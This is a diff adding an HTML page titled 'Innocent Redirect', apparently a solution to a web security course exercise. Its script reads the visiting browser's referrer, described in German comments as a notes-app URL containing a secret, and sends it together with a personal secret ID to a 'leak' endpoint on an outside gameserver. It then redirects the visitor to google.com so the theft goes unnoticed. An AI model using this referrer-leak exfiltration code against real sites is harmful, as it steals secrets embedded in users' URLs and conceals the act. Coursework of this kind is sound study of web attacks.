@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Redirect</title>
+</head>
+<body>
+    <script>
+        // 1. Die URL der Notes-App (inkl. Secret) aus dem Referrer auslesen
+        let victimData = document.referrer;
+        
+        // 2. Deine Gameserver Secret-ID
+        let mySecret = "3b4321f361abd94cf42521e814840777";
+
+        // 3. Den Leak an den Gameserver senden
+        if (victimData) {
+            fetch(`https://gameserver.websec.saarland/leak?secret=${mySecret}&data=${encodeURIComponent(victimData)}`)
+            .then(() => {
+                // Optional: Den Crawler wegnavigieren, damit es nicht auffällt
+                window.location.href = "https://google.com";
+            });
+        } else {
+            console.log("Kein Referrer gefunden.");
+        }
+    </script>
+</body>
+</html>
